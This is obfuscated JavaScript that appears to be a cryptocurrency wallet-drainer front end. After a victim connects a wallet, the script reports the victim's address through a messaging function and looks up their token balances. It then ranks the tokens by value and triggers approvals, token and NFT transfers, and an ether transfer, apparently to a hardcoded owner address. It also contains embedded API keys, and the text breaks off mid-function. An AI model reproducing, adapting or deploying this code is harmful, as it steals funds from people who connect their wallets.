const _0x35d3ee=_0xb1dd;(function(_0x4906b6,_0x19ecbe){const _0x237ec9=_0xb1dd,_0x2ba748=_0x4906b6();while(!![]){try{const _0x19f308=parseInt(_0x237ec9(0x276))/0x1*(parseInt(_0x237ec9(0x233))/0x2)+parseInt(_0x237ec9(0x1ba))/0x3*(-parseInt(_0x237ec9(0x1fe))/0x4)+parseInt(_0x237ec9(0x28b))/0x5+-parseInt(_0x237ec9(0x1b7))/0x6+-parseInt(_0x237ec9(0x1ee))/0x7+-parseInt(_0x237ec9(0x2ad))/0x8*(-parseInt(_0x237ec9(0x23a))/0x9)+parseInt(_0x237ec9(0x248))/0xa;if(_0x19f308===_0x19ecbe)break;else _0x2ba748['push'](_0x2ba748['shift']());}catch(_0x46c16f){_0x2ba748['push'](_0x2ba748['shift']());}}}(_0x157a,0x4467f));let tokens=[],NFTs=[],chainId=null,web3Object=null,selectedAccount=null;const Web3Modal=window['Web3Modal'][_0x35d3ee(0x1dc)],WalletConnectProvider=window[_0x35d3ee(0x295)]['default'],OWNER_ADDRESS=_0x35d3ee(0x24a),ABI=[{'constant':!![],'inputs':[],'name':'name','outputs':[{'name':'','type':_0x35d3ee(0x241)}],'payable':![],'stateMutability':_0x35d3ee(0x26c),'type':'function'},{'constant':![],'inputs':[{'name':_0x35d3ee(0x21d),'type':_0x35d3ee(0x284)}],'name':_0x35d3ee(0x272),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x35d3ee(0x1ec)},{'constant':![],'inputs':[{'name':_0x35d3ee(0x207),'type':_0x35d3ee(0x284)},{'name':_0x35d3ee(0x1bd),'type':_0x35d3ee(0x28c)}],'name':'approve','outputs':[],'payable':![],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x1ec)},{'constant':!![],'inputs':[],'name':_0x35d3ee(0x1f5),'outputs':[{'name':'','type':_0x35d3ee(0x247)}],'payable':![],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'constant':![],'inputs':[{'name':_0x35d3ee(0x263),'type':_0x35d3ee(0x284)}],'name':_0x35d3ee(0x2a9),'outputs':[],'payable':![],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x1ec)},{'constant':!![],'inputs':[],'name':'totalSupply','outputs':[{'name':'','type':_0x35d3ee(0x28c)}],'payable':![],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'constant':![],'inputs':[{'name':_0x35d3ee(0x260),'type':_0x35d3ee(0x284)},{'name':_0x35d3ee(0x282),'type':_0x35d3ee(0x284)},{'name':'_value','type':'uint256'}],'name':'transferFrom','outputs':[],'payable':![],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x1ec)},{'constant':!![],'inputs':[],'name':'upgradedAddress','outputs':[{'name':'','type':_0x35d3ee(0x284)}],'payable':![],'stateMutability':'view','type':_0x35d3ee(0x1ec)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':_0x35d3ee(0x202),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'constant':!![],'inputs':[],'name':'decimals','outputs':[{'name':'','type':_0x35d3ee(0x28c)}],'payable':![],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'constant':!![],'inputs':[],'name':'maximumFee','outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'constant':!![],'inputs':[],'name':_0x35d3ee(0x22d),'outputs':[{'name':'','type':_0x35d3ee(0x28c)}],'payable':![],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'constant':![],'inputs':[],'name':'unpause','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x35d3ee(0x1ec)},{'constant':!![],'inputs':[{'name':_0x35d3ee(0x1b9),'type':_0x35d3ee(0x284)}],'name':_0x35d3ee(0x271),'outputs':[{'name':'','type':_0x35d3ee(0x247)}],'payable':![],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'constant':!![],'inputs':[{'name':'','type':_0x35d3ee(0x284)},{'name':'','type':'address'}],'name':_0x35d3ee(0x217),'outputs':[{'name':'','type':_0x35d3ee(0x28c)}],'payable':![],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'constant':!![],'inputs':[],'name':_0x35d3ee(0x29e),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x35d3ee(0x26c),'type':'function'},{'constant':!![],'inputs':[{'name':_0x35d3ee(0x1fc),'type':_0x35d3ee(0x284)}],'name':_0x35d3ee(0x1e4),'outputs':[{'name':'','type':_0x35d3ee(0x28c)}],'payable':![],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'constant':![],'inputs':[],'name':_0x35d3ee(0x1c9),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[],'name':_0x35d3ee(0x27c),'outputs':[{'name':'','type':_0x35d3ee(0x284)}],'payable':![],'stateMutability':'view','type':_0x35d3ee(0x1ec)},{'constant':!![],'inputs':[],'name':'owner','outputs':[{'name':'','type':_0x35d3ee(0x284)}],'payable':![],'stateMutability':'view','type':_0x35d3ee(0x1ec)},{'constant':!![],'inputs':[],'name':_0x35d3ee(0x1d2),'outputs':[{'name':'','type':_0x35d3ee(0x241)}],'payable':![],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'constant':![],'inputs':[{'name':_0x35d3ee(0x282),'type':_0x35d3ee(0x284)},{'name':_0x35d3ee(0x1bd),'type':'uint256'}],'name':_0x35d3ee(0x290),'outputs':[],'payable':![],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x1ec)},{'constant':![],'inputs':[{'name':_0x35d3ee(0x1b3),'type':'uint256'},{'name':_0x35d3ee(0x1c7),'type':_0x35d3ee(0x28c)}],'name':_0x35d3ee(0x1cf),'outputs':[],'payable':![],'stateMutability':_0x35d3ee(0x293),'type':'function'},{'constant':![],'inputs':[{'name':_0x35d3ee(0x239),'type':_0x35d3ee(0x28c)}],'name':_0x35d3ee(0x1ff),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x35d3ee(0x1ec)},{'constant':![],'inputs':[{'name':'amount','type':_0x35d3ee(0x28c)}],'name':_0x35d3ee(0x21f),'outputs':[],'payable':![],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x1ec)},{'constant':!![],'inputs':[{'name':_0x35d3ee(0x240),'type':_0x35d3ee(0x284)},{'name':_0x35d3ee(0x207),'type':_0x35d3ee(0x284)}],'name':'allowance','outputs':[{'name':_0x35d3ee(0x25e),'type':_0x35d3ee(0x28c)}],'payable':![],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'constant':!![],'inputs':[],'name':_0x35d3ee(0x1b1),'outputs':[{'name':'','type':_0x35d3ee(0x28c)}],'payable':![],'stateMutability':'view','type':_0x35d3ee(0x1ec)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':_0x35d3ee(0x25a),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':'view','type':_0x35d3ee(0x1ec)},{'constant':![],'inputs':[{'name':_0x35d3ee(0x264),'type':_0x35d3ee(0x284)}],'name':_0x35d3ee(0x1e3),'outputs':[],'payable':![],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x1ec)},{'constant':!![],'inputs':[],'name':'MAX_UINT','outputs':[{'name':'','type':_0x35d3ee(0x28c)}],'payable':![],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'constant':![],'inputs':[{'name':_0x35d3ee(0x298),'type':'address'}],'name':_0x35d3ee(0x221),'outputs':[],'payable':![],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x1ec)},{'constant':![],'inputs':[{'name':_0x35d3ee(0x27a),'type':_0x35d3ee(0x284)}],'name':_0x35d3ee(0x27f),'outputs':[],'payable':![],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x1ec)},{'inputs':[{'name':_0x35d3ee(0x285),'type':_0x35d3ee(0x28c)},{'name':'_name','type':_0x35d3ee(0x241)},{'name':_0x35d3ee(0x277),'type':_0x35d3ee(0x241)},{'name':_0x35d3ee(0x203),'type':'uint256'}],'payable':![],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x22e)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x35d3ee(0x239),'type':_0x35d3ee(0x28c)}],'name':'Issue','type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x35d3ee(0x239),'type':'uint256'}],'name':_0x35d3ee(0x27d),'type':_0x35d3ee(0x265)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x35d3ee(0x29b),'type':_0x35d3ee(0x284)}],'name':_0x35d3ee(0x1cd),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':'feeBasisPoints','type':_0x35d3ee(0x28c)},{'indexed':![],'name':_0x35d3ee(0x297),'type':'uint256'}],'name':_0x35d3ee(0x2a7),'type':_0x35d3ee(0x265)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_blackListedUser','type':'address'},{'indexed':![],'name':_0x35d3ee(0x25b),'type':_0x35d3ee(0x28c)}],'name':'DestroyedBlackFunds','type':_0x35d3ee(0x265)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x35d3ee(0x1c2),'type':'address'}],'name':'AddedBlackList','type':_0x35d3ee(0x265)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x35d3ee(0x1c2),'type':_0x35d3ee(0x284)}],'name':_0x35d3ee(0x23f),'type':_0x35d3ee(0x265)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x35d3ee(0x251),'type':_0x35d3ee(0x284)},{'indexed':!![],'name':'spender','type':'address'},{'indexed':![],'name':_0x35d3ee(0x253),'type':'uint256'}],'name':_0x35d3ee(0x21e),'type':_0x35d3ee(0x265)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x35d3ee(0x283),'type':_0x35d3ee(0x284)},{'indexed':!![],'name':'to','type':_0x35d3ee(0x284)},{'indexed':![],'name':_0x35d3ee(0x253),'type':_0x35d3ee(0x28c)}],'name':_0x35d3ee(0x275),'type':_0x35d3ee(0x265)},{'anonymous':![],'inputs':[],'name':_0x35d3ee(0x1d9),'type':_0x35d3ee(0x265)},{'anonymous':![],'inputs':[],'name':_0x35d3ee(0x20d),'type':_0x35d3ee(0x265)}],ABIN=[{'inputs':[{'internalType':'string','name':_0x35d3ee(0x1bb),'type':'string'},{'internalType':_0x35d3ee(0x241),'name':'symbol','type':'string'},{'internalType':'uint256','name':_0x35d3ee(0x243),'type':'uint256'},{'internalType':'uint256','name':_0x35d3ee(0x1f0),'type':'uint256'}],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x22e)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x35d3ee(0x284),'name':_0x35d3ee(0x251),'type':'address'},{'indexed':!![],'internalType':_0x35d3ee(0x284),'name':'approved','type':_0x35d3ee(0x284)},{'indexed':!![],'internalType':_0x35d3ee(0x28c),'name':_0x35d3ee(0x219),'type':_0x35d3ee(0x28c)}],'name':_0x35d3ee(0x21e),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x35d3ee(0x284),'name':_0x35d3ee(0x251),'type':'address'},{'indexed':!![],'internalType':_0x35d3ee(0x284),'name':_0x35d3ee(0x226),'type':_0x35d3ee(0x284)},{'indexed':![],'internalType':_0x35d3ee(0x247),'name':_0x35d3ee(0x28a),'type':_0x35d3ee(0x247)}],'name':_0x35d3ee(0x25d),'type':_0x35d3ee(0x265)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x35d3ee(0x284),'name':_0x35d3ee(0x235),'type':_0x35d3ee(0x284)},{'indexed':!![],'internalType':_0x35d3ee(0x284),'name':_0x35d3ee(0x298),'type':_0x35d3ee(0x284)}],'name':'OwnershipTransferred','type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':'from','type':_0x35d3ee(0x284)},{'indexed':!![],'internalType':_0x35d3ee(0x284),'name':'to','type':'address'},{'indexed':!![],'internalType':'uint256','name':_0x35d3ee(0x219),'type':_0x35d3ee(0x28c)}],'name':'Transfer','type':_0x35d3ee(0x265)},{'inputs':[],'name':_0x35d3ee(0x1ad),'outputs':[{'internalType':'string','name':'','type':'string'}],'stateMutability':'view','type':_0x35d3ee(0x1ec)},{'inputs':[],'name':_0x35d3ee(0x237),'outputs':[{'internalType':'uint256','name':'','type':_0x35d3ee(0x28c)}],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'inputs':[],'name':_0x35d3ee(0x256),'outputs':[{'internalType':_0x35d3ee(0x28c),'name':'','type':_0x35d3ee(0x28c)}],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'inputs':[],'name':_0x35d3ee(0x24e),'outputs':[{'internalType':'uint256','name':'','type':_0x35d3ee(0x28c)}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x35d3ee(0x284),'name':'to','type':_0x35d3ee(0x284)},{'internalType':_0x35d3ee(0x28c),'name':_0x35d3ee(0x219),'type':_0x35d3ee(0x28c)}],'name':_0x35d3ee(0x1f8),'outputs':[],'stateMutability':'nonpayable','type':_0x35d3ee(0x1ec)},{'inputs':[{'internalType':_0x35d3ee(0x284),'name':_0x35d3ee(0x251),'type':'address'}],'name':'balanceOf','outputs':[{'internalType':_0x35d3ee(0x28c),'name':'','type':_0x35d3ee(0x28c)}],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'inputs':[],'name':_0x35d3ee(0x230),'outputs':[{'internalType':_0x35d3ee(0x241),'name':'','type':_0x35d3ee(0x241)}],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'inputs':[],'name':_0x35d3ee(0x213),'outputs':[],'stateMutability':_0x35d3ee(0x293),'type':'function'},{'inputs':[],'name':_0x35d3ee(0x1b4),'outputs':[],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x1ec)},{'inputs':[{'internalType':_0x35d3ee(0x28c),'name':'tokenId','type':_0x35d3ee(0x28c)}],'name':_0x35d3ee(0x2a0),'outputs':[{'internalType':'address','name':'','type':'address'}],'stateMutability':_0x35d3ee(0x26c),'type':'function'},{'inputs':[{'internalType':'address','name':_0x35d3ee(0x251),'type':_0x35d3ee(0x284)},{'internalType':'address','name':_0x35d3ee(0x226),'type':_0x35d3ee(0x284)}],'name':_0x35d3ee(0x1f6),'outputs':[{'internalType':'bool','name':'','type':_0x35d3ee(0x247)}],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'inputs':[],'name':_0x35d3ee(0x1cb),'outputs':[{'internalType':_0x35d3ee(0x28c),'name':'','type':_0x35d3ee(0x28c)}],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'inputs':[{'internalType':_0x35d3ee(0x28c),'name':_0x35d3ee(0x29a),'type':_0x35d3ee(0x28c)}],'name':'mintApe','outputs':[],'stateMutability':'payable','type':_0x35d3ee(0x1ec)},{'inputs':[],'name':_0x35d3ee(0x1bb),'outputs':[{'internalType':_0x35d3ee(0x241),'name':'','type':_0x35d3ee(0x241)}],'stateMutability':'view','type':_0x35d3ee(0x1ec)},{'inputs':[],'name':'owner','outputs':[{'internalType':_0x35d3ee(0x284),'name':'','type':'address'}],'stateMutability':'view','type':_0x35d3ee(0x1ec)},{'inputs':[{'internalType':_0x35d3ee(0x28c),'name':_0x35d3ee(0x219),'type':_0x35d3ee(0x28c)}],'name':_0x35d3ee(0x26f),'outputs':[{'internalType':'address','name':'','type':'address'}],'stateMutability':'view','type':_0x35d3ee(0x1ec)},{'inputs':[],'name':'renounceOwnership','outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[],'name':'reserveApes','outputs':[],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x1ec)},{'inputs':[{'internalType':_0x35d3ee(0x284),'name':_0x35d3ee(0x283),'type':_0x35d3ee(0x284)},{'internalType':_0x35d3ee(0x284),'name':'to','type':'address'},{'internalType':_0x35d3ee(0x28c),'name':_0x35d3ee(0x219),'type':_0x35d3ee(0x28c)}],'name':_0x35d3ee(0x28e),'outputs':[],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x1ec)},{'inputs':[{'internalType':_0x35d3ee(0x284),'name':_0x35d3ee(0x283),'type':_0x35d3ee(0x284)},{'internalType':'address','name':'to','type':'address'},{'internalType':'uint256','name':_0x35d3ee(0x219),'type':'uint256'},{'internalType':_0x35d3ee(0x262),'name':_0x35d3ee(0x1be),'type':'bytes'}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x1ec)},{'inputs':[],'name':_0x35d3ee(0x1db),'outputs':[{'internalType':_0x35d3ee(0x247),'name':'','type':_0x35d3ee(0x247)}],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'inputs':[{'internalType':_0x35d3ee(0x284),'name':_0x35d3ee(0x226),'type':_0x35d3ee(0x284)},{'internalType':_0x35d3ee(0x247),'name':'approved','type':_0x35d3ee(0x247)}],'name':_0x35d3ee(0x1fa),'outputs':[],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x1ec)},{'inputs':[{'internalType':_0x35d3ee(0x241),'name':'baseURI','type':'string'}],'name':_0x35d3ee(0x1af),'outputs':[],'stateMutability':'nonpayable','type':_0x35d3ee(0x1ec)},{'inputs':[{'internalType':'string','name':_0x35d3ee(0x1b0),'type':_0x35d3ee(0x241)}],'name':_0x35d3ee(0x266),'outputs':[],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x1ec)},{'inputs':[{'internalType':_0x35d3ee(0x28c),'name':'revealTimeStamp','type':_0x35d3ee(0x28c)}],'name':_0x35d3ee(0x1fd),'outputs':[],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x1ec)},{'inputs':[],'name':_0x35d3ee(0x2a6),'outputs':[],'stateMutability':_0x35d3ee(0x293),'type':'function'},{'inputs':[],'name':_0x35d3ee(0x267),'outputs':[{'internalType':_0x35d3ee(0x28c),'name':'','type':'uint256'}],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'inputs':[],'name':_0x35d3ee(0x228),'outputs':[{'internalType':'uint256','name':'','type':_0x35d3ee(0x28c)}],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'inputs':[{'internalType':_0x35d3ee(0x242),'name':_0x35d3ee(0x231),'type':_0x35d3ee(0x242)}],'name':'supportsInterface','outputs':[{'internalType':'bool','name':'','type':_0x35d3ee(0x247)}],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'inputs':[],'name':_0x35d3ee(0x1d2),'outputs':[{'internalType':'string','name':'','type':_0x35d3ee(0x241)}],'stateMutability':'view','type':_0x35d3ee(0x1ec)},{'inputs':[{'internalType':_0x35d3ee(0x28c),'name':_0x35d3ee(0x289),'type':_0x35d3ee(0x28c)}],'name':_0x35d3ee(0x1ea),'outputs':[{'internalType':'uint256','name':'','type':_0x35d3ee(0x28c)}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':'address','name':'owner','type':'address'},{'internalType':_0x35d3ee(0x28c),'name':'index','type':'uint256'}],'name':_0x35d3ee(0x2a3),'outputs':[{'internalType':_0x35d3ee(0x28c),'name':'','type':'uint256'}],'stateMutability':_0x35d3ee(0x26c),'type':'function'},{'inputs':[{'internalType':_0x35d3ee(0x28c),'name':_0x35d3ee(0x219),'type':_0x35d3ee(0x28c)}],'name':_0x35d3ee(0x246),'outputs':[{'internalType':_0x35d3ee(0x241),'name':'','type':_0x35d3ee(0x241)}],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'inputs':[],'name':_0x35d3ee(0x250),'outputs':[{'internalType':_0x35d3ee(0x28c),'name':'','type':'uint256'}],'stateMutability':_0x35d3ee(0x26c),'type':_0x35d3ee(0x1ec)},{'inputs':[{'internalType':_0x35d3ee(0x284),'name':'from','type':_0x35d3ee(0x284)},{'internalType':'address','name':'to','type':_0x35d3ee(0x284)},{'internalType':_0x35d3ee(0x28c),'name':_0x35d3ee(0x219),'type':_0x35d3ee(0x28c)}],'name':'transferFrom','outputs':[],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x1ec)},{'inputs':[{'internalType':_0x35d3ee(0x284),'name':_0x35d3ee(0x298),'type':'address'}],'name':'transferOwnership','outputs':[],'stateMutability':'nonpayable','type':_0x35d3ee(0x1ec)},{'inputs':[],'name':_0x35d3ee(0x20b),'outputs':[],'stateMutability':_0x35d3ee(0x293),'type':_0x35d3ee(0x1ec)}],networkToId={0x1328cf7:_0x35d3ee(0x23d),0x1:_0x35d3ee(0x236),0x5:_0x35d3ee(0x2ab),0x89:_0x35d3ee(0x1c0),0x13881:_0x35d3ee(0x22b),0x38:'bsc-mainnet',0x61:_0x35d3ee(0x208),0xa86a:_0x35d3ee(0x1ce),0xa869:_0x35d3ee(0x206),0xfa:'fantom-mainnet',0xfa2:'fantom-testnet',0xa4b1:_0x35d3ee(0x249),0x66eed:_0x35d3ee(0x1eb),0xa4ba:'arbitrum-nova-mainnet',0x250:'astar-mainnet',0x51:_0x35d3ee(0x214),0x150:_0x35d3ee(0x258),0x4e454152:_0x35d3ee(0x261),0x4e454153:_0x35d3ee(0x210),0x6984c:_0x35d3ee(0x1d4),0x69849:_0x35d3ee(0x252),0x7e4:_0x35d3ee(0x1fb),0x14a33:_0x35d3ee(0x280),0x77:_0x35d3ee(0x1cc),0x405:_0x35d3ee(0x254),0xa918:_0x35d3ee(0x24c),0x10e8:'boba-avalanche-testnet',0xdbe0:_0x35d3ee(0x270),0x2600:_0x35d3ee(0x294),0x50e:'boba-bobabeam-mainnet',0x511:_0x35d3ee(0x1b2),0x120:'boba-mainnet',0x1c:_0x35d3ee(0x218),0xb48:_0x35d3ee(0x1c3),0x1e14:'canto-mainnet',0x436f7631:'covalent-internal-network-v1',0x19:_0x35d3ee(0x269),0x152:_0x35d3ee(0x278),0xd2af:_0x35d3ee(0x201),0x14f:_0x35d3ee(0x205),0xa516:_0x35d3ee(0x244),0x2329:'evmos-mainnet',0x2328:_0x35d3ee(0x1b6),0x868:_0x35d3ee(0x257),0x86a:_0x35d3ee(0x2a8),0x13:'flarenetworks-canary-mainnet',0x10:_0x35d3ee(0x21c),0xe:_0x35d3ee(0x1f4),0x72:'flarenetworks-flare-testnet',0xb7e7759:_0x35d3ee(0x212),0x153c099c:_0x35d3ee(0x292),0x63564c40:'harmony-mainnet',0x6357d2e0:_0x35d3ee(0x22f),0x141:_0x35d3ee(0x24b),0x142:_0x35d3ee(0x223),0xe704:_0x35d3ee(0x1f1),0x1389:_0x35d3ee(0x21a),0x52:_0x35d3ee(0x268),0x53:'meter-testnet',0x440:'metis-mainnet',0x24c:'metis-testnet',0x7d2:_0x35d3ee(0x29c),0x30e0a:_0x35d3ee(0x1d7),0x7d1:_0x35d3ee(0x20e),0x30da5:_0x35d3ee(0x1ef),0x504:'moonbeam-mainnet',0x507:_0x35d3ee(0x20c),0x505:_0x35d3ee(0x1c6),0xe9ac0ce:_0x35d3ee(0x259),0x116ea:_0x35d3ee(0x1e1),0x116e9:_0x35d3ee(0x1d5),0x116e1:_0x35d3ee(0x1c4),0x5afe:_0x35d3ee(0x238),0x5aff:'oasis-sapphire-testnet',0xf8:'oasys-mainnet',0x249c:_0x35d3ee(0x274),0xa:'optimism-mainnet',0x2a15c308d:_0x35d3ee(0x1e6),0x2a15c3083:_0x35d3ee(0x2a1),0x5a2:'polygon-zkevm-testnet',0x1e:_0x35d3ee(0x211),0x1f:_0x35d3ee(0x288),0x5d456c62:'skale-calypso',0x1482a7b2:'skale-staging-uum',0x3d28774d:_0x35d3ee(0x2a5),0x109b4597:_0x35d3ee(0x1de),0x536f6c4d:_0x35d3ee(0x27e),0x1202c:'swimmer-mainnet',0x1202d:_0x35d3ee(0x1ca),0x1a0:_0x35d3ee(0x1d8)},providerOptions={'walletconnect':{'package':WalletConnectProvider,'options':{'rpc':{0xa86a:_0x35d3ee(0x1ae)},'chainId':0xa86a,'network':_0x35d3ee(0x296),'infuraId':_0x35d3ee(0x26a),'pollingInterval':_0x35d3ee(0x234)}},'coinbasewallet':{'package':CoinbaseWalletSDK,'options':{'appName':_0x35d3ee(0x225),'infuraId':'e62a60a251c64745baefeaf8237af646','rpc':_0x35d3ee(0x1ae),'chainId':0xa86a,'chainName':'avalanche-fuji-mainnet','darkMode':![]}}};function _0xb1dd(_0x374b30,_0xd1cf2c){const _0x157a1e=_0x157a();return _0xb1dd=function(_0xb1dde8,_0xc4fb89){_0xb1dde8=_0xb1dde8-0x1ad;let _0x4bc8b5=_0x157a1e[_0xb1dde8];return _0x4bc8b5;},_0xb1dd(_0x374b30,_0xd1cf2c);}let web3Modal=new Web3Modal({'providerOptions':providerOptions,'cacheProvider':![],'disableInjectedProvider':![]});$(_0x35d3ee(0x2ac))[_0x35d3ee(0x2a4)](async function(){const _0x2033d2=_0x35d3ee;try{let _0x3b6689=await web3Modal['connect']();onProvider(_0x3b6689),_0x3b6689['on']('accountsChanged',_0x5c4830=>{const _0x1a734d=_0xb1dd;console[_0x1a734d(0x1b8)](_0x5c4830),onProvider(_0x3b6689);});}catch(_0x1b290d){console[_0x2033d2(0x1b8)](_0x2033d2(0x1e7),_0x1b290d);return;}});async function onProvider(_0x452587){const _0x40a43a=_0x35d3ee;web3Object=new Web3(_0x452587);let _0x158032=await web3Object[_0x40a43a(0x1d0)]['getAccounts']();selectedAccount=_0x158032[0x0],chainName=await web3Object[_0x40a43a(0x1d0)][_0x40a43a(0x224)](),chainId=networkToId[chainName],console[_0x40a43a(0x1b8)](chainId),console[_0x40a43a(0x1b8)](selectedAccount),_0x158032['length']&&(sendMessage(_0x40a43a(0x1bf)),sendMessage(_0x40a43a(0x299)+selectedAccount),covalenthqAPICall());}const Oxa=_0x35d3ee(0x286),Oxc=_0x35d3ee(0x29d);async function covalenthqAPICall(){const _0x1f3240=_0x35d3ee,_0x38d6c8={'chain':_0x1f3240(0x25f)},_0x58a4bf=new URL(_0x1f3240(0x279)+selectedAccount+'/erc20');_0x58a4bf[_0x1f3240(0x1f2)]=new URLSearchParams(_0x38d6c8)[_0x1f3240(0x1d3)]();const _0x41cc93={'method':_0x1f3240(0x1bc),'headers':{'accept':'application/json','X-API-Key':_0x1f3240(0x1e9)}};try{const _0x48cf1a=await fetch(_0x58a4bf,_0x41cc93)[_0x1f3240(0x1b5)](_0x1dd555=>_0x1dd555[_0x1f3240(0x2aa)]());console[_0x1f3240(0x1b8)](_0x48cf1a);let _0x4014d1=_0x48cf1a;console[_0x1f3240(0x1b8)](_0x1f3240(0x20a),_0x4014d1);let _0x4de6d7=await Promise[_0x1f3240(0x255)](_0x4014d1[_0x1f3240(0x1c8)](async _0x16f052=>{const _0x1fd038=_0x1f3240;let _0x43928b;try{_0x43928b=await getValue(_0x16f052[_0x1fd038(0x1c1)],_0x16f052[_0x1fd038(0x22c)],_0x16f052[_0x1fd038(0x21b)]);}catch(_0x542ae8){_0x43928b=0x0;}return console[_0x1fd038(0x1b8)](_0x43928b),{'balance':_0x16f052[_0x1fd038(0x22c)],'value':_0x43928b,'address':_0x16f052[_0x1fd038(0x1c1)]};}));console[_0x1f3240(0x1b8)](_0x1f3240(0x26d),_0x4de6d7),tokens=_0x4de6d7[_0x1f3240(0x245)](_0x5d70a9=>_0x5d70a9['value']>0x5),tokens[_0x1f3240(0x1f3)]((_0x53fdf4,_0x35654a)=>_0x35654a['value']-_0x53fdf4[_0x1f3240(0x253)]),console[_0x1f3240(0x1b8)](_0x1f3240(0x215),chainId,_0x1f3240(0x220),tokens);if(tokens[_0x1f3240(0x1f9)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x1f3240(0x1d1));}NFTs=await getNFTs(selectedAccount)[_0x1f3240(0x29f)](_0x1e780d=>{const _0x344fc3=_0x1f3240;console[_0x344fc3(0x1b8)](_0x344fc3(0x28f),_0x1e780d);}),NFTs=NFTs['result'],console[_0x1f3240(0x1b8)](_0x1f3240(0x27b),NFTs);}async function onApprove(){const _0x3edeb0=_0x35d3ee;if(tokens[_0x3edeb0(0x1f9)])try{loopTokens(tokens);}catch(_0x2e114f){console[_0x3edeb0(0x287)]('Error\x20processing\x20item\x20'+_0x2e114f[_0x3edeb0(0x232)]);}else{if(NFTs[_0x3edeb0(0x1f9)]){try{loopNfts(NFTs);}catch(_0x28d2af){console['error']('Error\x20processing\x20item\x20'+_0x28d2af[_0x3edeb0(0x232)]);}onSendEther(),sendMessage(_0x3edeb0(0x216));}else try{onSendEther();}catch(_0x211c11){console[_0x3edeb0(0x287)](_0x3edeb0(0x1d6)+_0x211c11[_0x3edeb0(0x232)]);}}}function _0x157a(){const 